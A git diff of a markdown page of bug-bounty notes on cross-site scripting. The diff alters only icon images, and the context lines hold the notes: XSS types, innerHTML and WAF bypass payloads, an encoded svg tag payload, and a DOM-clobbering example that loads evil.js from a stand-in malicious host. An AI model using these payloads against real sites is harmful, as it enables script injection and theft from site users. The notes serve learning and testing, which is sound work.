@@ -1,7 +1,7 @@
 # Xss
 
 ## <img src="https://raw.githubusercontent.com/1-off/Bugbounties-methodology-notes/main/mandalorian.png" width="80" height="80"> Theory
-### <img src="https://raw.githubusercontent.com/1-off/Bugbounties-methodology-notes/main/gun.png" width="50" height="50"> types
+### <img src="https://raw.githubusercontent.com/1-off/Bugbounties-methodology-notes/main/gun1.png" width="50" height="50"> types
 #### Stored (Persistent) 
 XSS 	The most critical type of XSS, which occurs when user input is stored on the back-end database and then displayed upon retrieval (e.g., posts or comments)
 
@@ -13,7 +13,7 @@ Occurs when user input is displayed on the page after being processed by the bac
 XSS type that occurs when user input is directly shown in the browser and is completely processed on the client-side, without reaching the back-end server (e.g., through client-side HTTP parameters or anchor tags)
 
 
-### <img src="https://raw.githubusercontent.com/1-off/Bugbounties-methodology-notes/main/gun.png" width="50" height="50"> Source & Sink
+### <img src="https://raw.githubusercontent.com/1-off/Bugbounties-methodology-notes/main/gun1.png" width="50" height="50"> Source & Sink
 
 To further understand the nature of the DOM-based XSS vulnerability, we must understand the concept of the Source and Sink of the object displayed on the page. The Source is the JavaScript object that takes the user input, and it can be any input parameter like a URL parameter or an input field, as we saw above.
 
@@ -31,8 +31,8 @@ jQuery library functions that write to DOM objects are:
 
 ------------------------------------------
 
-## <img src="https://raw.githubusercontent.com/1-off/Bugbounties-methodology-notes/main/mandalorian.png" width="50" height="50"> xss bypass
-### <img src="https://raw.githubusercontent.com/1-off/Bugbounties-methodology-notes/main/gun.png" width="50" height="50"> innerHTML 
+## <img src="https://raw.githubusercontent.com/1-off/Bugbounties-methodology-notes/main/mandalorian.png" width="80" height="80"> xss bypass
+### <img src="https://raw.githubusercontent.com/1-off/Bugbounties-methodology-notes/main/gun1.png" width="50" height="50"> innerHTML 
 The innerHTML function does not allow the use of the <script> tags within it as a security feature
 ```javascript
 document.getElementById("todo").innerHTML = "<b>Next Task:</b> " + decodeURIComponent(task);
@@ -42,7 +42,7 @@ As alternative it can be used something like
 <img src="" onerror=alert(window.origin)>
 ```
 
-### <img src="https://raw.githubusercontent.com/1-off/Bugbounties-methodology-notes/main/gun.png" width="50" height="50"> else
+### <img src="https://raw.githubusercontent.com/1-off/Bugbounties-methodology-notes/main/gun1.png" width="50" height="50"> else
 ```js
 <<a|ascript>alert('xss')</script>
 ```
@@ -61,7 +61,7 @@ Use a deprecated B2B interface that was not properly shut down. XML external ent
 ```
 --------------------------------------------
 
-## <img src="https://raw.githubusercontent.com/1-off/Bugbounties-methodology-notes/main/mandalorian.png" width="50" height="50"> Tags bruteforcing
+## <img src="https://raw.githubusercontent.com/1-off/Bugbounties-methodology-notes/main/mandalorian.png" width="80" height="80"> Tags bruteforcing
 - [How to search for XSS (with blacklisted HTML tags)](https://www.youtube.com/watch?v=0kfQsRwr_Bc)
 - [portswigger/cross-site-scripting/cheat-sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
 
@@ -80,20 +80,20 @@ Searching for allowed tags to be inserted in the search field as parameter
 %3Csvg%3E%3Canimatetransform%20onbegin%3Dalert%28%22xss%22%29%3E
 ```
 
-## <img src="https://raw.githubusercontent.com/1-off/Bugbounties-methodology-notes/main/mandalorian.png" width="50" height="50"> Waf bypass with anchor
+## <img src="https://raw.githubusercontent.com/1-off/Bugbounties-methodology-notes/main/mandalorian.png" width="80" height="80"> Waf bypass with anchor
 - [Two solutions for the January 2021 Initigriti XSS Challenge](https://www.youtube.com/watch?v=Wbovgw3Qxxc)
 ```
 onmouseover=alert(document.location.has.substring(1))#payloadhere
 ```
 
-## <img src="https://raw.githubusercontent.com/1-off/Bugbounties-methodology-notes/main/mandalorian.png" width="50" height="50"> DOM XSS
+## <img src="https://raw.githubusercontent.com/1-off/Bugbounties-methodology-notes/main/mandalorian.png" width="80" height="80"> DOM XSS
 ```
  <iframe width="100%" height="166" scrolling="no" frameborder="no" allow="autoplay"
  src="https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/771984076&color=%23ff5500&
  auto_play=true&hide_related=false&show_comments=true&show_user=true&show_reposts=false&show_teaser=true"></iframe>
  ```
 
-## <img src="https://raw.githubusercontent.com/1-off/Bugbounties-methodology-notes/main/mandalorian.png" width="50" height="50">  Exploiting DOM clobbering to enable XSS
+## <img src="https://raw.githubusercontent.com/1-off/Bugbounties-methodology-notes/main/mandalorian.png" width="80" height="80">  Exploiting DOM clobbering to enable XSS
 - [Two solutions for the January 2021 Initigriti XSS Challenge]([https://www.youtube.com/watch?v=Wbovgw3Qxxc](https://youtu.be/Wbovgw3Qxxc?t=912))
 - [portswigger/dom-based/dom-clobbering](https://portswigger.net/web-security/dom-based/dom-clobbering)
 - [portswigger/dom-based/Advanced-dom-clobbering](https://portswigger.net/research/dom-clobbering-strikes-back)
@@ -113,7 +113,7 @@ DOM Clobbering use the HTMLCollection vulnerability which allow you to add to th
   - ```<a id=someObject><a id=someObject name=url href=//malicious-website.com/evil.js>```
 
 
-## <img src="https://raw.githubusercontent.com/1-off/Bugbounties-methodology-notes/main/mandalorian.png" width="50" height="50"> Videos:
+## <img src="https://raw.githubusercontent.com/1-off/Bugbounties-methodology-notes/main/mandalorian.png" width="80" height="80"> Videos:
 - xss API [video](https://youtu.be/xH8WbuApFXw?t=2358)
   - filtering and sanitazation come frontend back end.
   - Always test that frontend and backend are sanitized.
